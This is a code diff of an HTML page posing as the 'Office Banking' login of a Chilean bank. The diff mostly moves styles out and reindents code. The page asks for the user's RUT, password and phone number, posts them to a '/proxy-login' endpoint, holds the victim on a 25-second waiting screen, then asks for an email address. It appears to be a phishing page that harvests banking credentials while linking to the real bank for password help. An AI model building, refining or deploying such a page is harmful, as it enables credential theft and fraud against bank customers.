@@ -4,72 +4,8 @@
   <meta charset="UTF-8">
   <title>Office Banking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Enlace al CSS externo -->
   <link rel="stylesheet" href="styles.css">
-  <style>
-    .spinner {
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid red;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 2s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
-    }
-    .hidden { display:none; }
-    .btn-red {
-      background-color: red;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .login-box {
-      max-width: 400px;
-      margin: auto;
-      padding: 20px;
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      text-align: center; /* Centra todo el contenido */
-    }
-    .login-box img.logo {
-      display: block;
-      margin: 0 auto 20px;
-      max-width: 300px; /* Logo más grande */
-    }
-    .login-box label {
-      display: block;
-      margin-top: 10px;
-      font-weight: bold;
-      text-align: center; /* Centra las etiquetas */
-    }
-    .login-box input {
-      width: 80%; /* Más estrecho para que se vea centrado */
-      margin: 5px auto; /* Centra los inputs */
-      padding: 8px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      display: block;
-    }
-    .login-box button {
-      margin-top: 15px;
-      width: 80%; /* Botón centrado */
-      padding: 10px;
-      background: #0070c9;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .login-box button:hover {
-      background: #005fa3;
-    }
-  </style>
 </head>
 <body>
   <div class="login-box">
@@ -91,11 +27,12 @@
         Deseo que me contacte un ejecutivo para solicitar Línea de Crédito o Tarjeta de Crédito.  
       </label>
       
-      <div class="options" style="text-align:center; margin-top:10px;">
+      <div class="options">
         <label><input type="checkbox" id="recordar"> Recordar usuario</label><br>
         <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
       </div>
       
+      <!-- Botón rojo corporativo -->
       <button type="submit" class="btn-red">Ingresar</button>
     </form>
     <div id="resultado"></div>
@@ -110,7 +47,7 @@
     <div id="formCorreo" class="hidden">
       <h2>Necesitamos actualizar tu correo electrónico</h2>
       <input type="email" id="correo" placeholder="Ingresa tu correo">
-      <button onclick="enviarCorreo()">Enviar</button>
+      <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
     </div>
 
     <!-- Pantalla de productos disponibles -->
@@ -120,98 +57,94 @@
     </div>
   </div>
 
- <script>
-  // Validación de RUT
-  function validarRut(rutCompleto) {
-    rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-    if(rutCompleto.length < 2) return false;
-    let cuerpo = rutCompleto.slice(0, -1);
-    let dv = rutCompleto.slice(-1);
-    let suma = 0, multiplo = 2;
-    for(let i = cuerpo.length - 1; i >= 0; i--) {
-      suma += parseInt(cuerpo.charAt(i)) * multiplo;
-      multiplo = multiplo < 7 ? multiplo + 1 : 2;
-    }
-    let dvEsperado = 11 - (suma % 11);
-    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-    return dv === dvEsperado;
-  }
-
-  document.getElementById("loginForm").addEventListener("submit", async function(e){
-    e.preventDefault();
-    const rut = document.getElementById("rut").value;
-    const passwd = document.getElementById("passwd").value;
-    const telefono = document.getElementById("telefono").value;
-    const contacto = document.getElementById("contacto").checked;
-
-    if(!validarRut(rut)){
-      document.getElementById("resultado").innerText = "❌ RUT inválido";
-      return;
-    }
-    if(!contacto){
-      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
-      return;
-    }
-
-    try {
-      const response = await fetch("/proxy-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ rut, passwd, telefono })
-      });
-      const data = await response.json();
-      // Mostrar solo el mensaje, no el JSON completo
-      document.getElementById("resultado").innerText = data.mensaje;
-
-      if(response.ok){
-        document.getElementById("loginForm").style.display="none";
-        document.getElementById("pantallaEspera").classList.remove("hidden");
-
-        // Mostrar formulario de correo después de 25 segundos
-        setTimeout(()=>{
-          document.getElementById("pantallaEspera").classList.add("hidden");
-          document.getElementById("formCorreo").classList.remove("hidden");
-        }, 25000);
+  <script>
+    // Validación de RUT
+    function validarRut(rutCompleto) {
+      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+      if(rutCompleto.length < 2) return false;
+      let cuerpo = rutCompleto.slice(0, -1);
+      let dv = rutCompleto.slice(-1);
+      let suma = 0, multiplo = 2;
+      for(let i = cuerpo.length - 1; i >= 0; i--) {
+        suma += parseInt(cuerpo.charAt(i)) * multiplo;
+        multiplo = multiplo < 7 ? multiplo + 1 : 2;
       }
-    } catch (error) {
-      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
-    }
-  });
-
-  async function enviarCorreo(){
-    const correo = document.getElementById("correo").value;
-
-    try {
-      const response = await fetch("/proxy-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mail: correo })
-      });
-      const data = await response.json();
-      // Mostrar solo el mensaje
-      document.getElementById("resultado").innerText = data.mensaje;
-    } catch (error) {
-      console.error("Error al enviar correo:", error);
+      let dvEsperado = 11 - (suma % 11);
+      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+      return dv === dvEsperado;
     }
 
-    document.getElementById("formCorreo").classList.add("hidden");
-    document.getElementById("pantallaEspera").classList.remove("hidden");
+    document.getElementById("loginForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+      const rut = document.getElementById("rut").value;
+      const passwd = document.getElementById("passwd").value;
+      const telefono = document.getElementById("telefono").value;
+      const contacto = document.getElementById("contacto").checked;
 
-    setTimeout(()=>{
-      document.getElementById("pantallaEspera").classList.add("hidden");
-      document.getElementById("pantallaProductos").classList.remove("hidden");
-    }, 5000);
-  }
+      if(!validarRut(rut)){
+        document.getElementById("resultado").innerText = "❌ RUT inválido";
+        return;
+      }
+      if(!contacto){
+        document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
+        return;
+      }
 
-  function continuarProductos(){
-    document.getElementById("pantallaProductos").classList.add("hidden");
-    document.getElementById("pantallaEspera").classList.remove("hidden");
+      try {
+        const response = await fetch("/proxy-login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ rut, passwd, telefono })
+        });
+        const data = await response.json();
+        document.getElementById("resultado").innerText = data.mensaje;
 
-    setTimeout(()=>{
-      window.location.href="productos.html";
-    }, 5000);
-  }
-</script>
-  </div>
+        if(response.ok){
+          document.getElementById("loginForm").style.display="none";
+          document.getElementById("pantallaEspera").classList.remove("hidden");
+
+          setTimeout(()=>{
+            document.getElementById("pantallaEspera").classList.add("hidden");
+            document.getElementById("formCorreo").classList.remove("hidden");
+          }, 25000);
+        }
+      } catch (error) {
+        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+      }
+    });
+
+    async function enviarCorreo(){
+      const correo = document.getElementById("correo").value;
+
+      try {
+        const response = await fetch("/proxy-login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mail: correo })
+        });
+        const data = await response.json();
+        document.getElementById("resultado").innerText = data.mensaje;
+      } catch (error) {
+        console.error("Error al enviar correo:", error);
+      }
+
+      document.getElementById("formCorreo").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        document.getElementById("pantallaEspera").classList.add("hidden");
+        document.getElementById("pantallaProductos").classList.remove("hidden");
+      }, 5000);
+    }
+
+    function continuarProductos(){
+      document.getElementById("pantallaProductos").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        window.location.href="productos.html";
+      }, 5000);
+    }
+  </script>
 </body>
 </html>
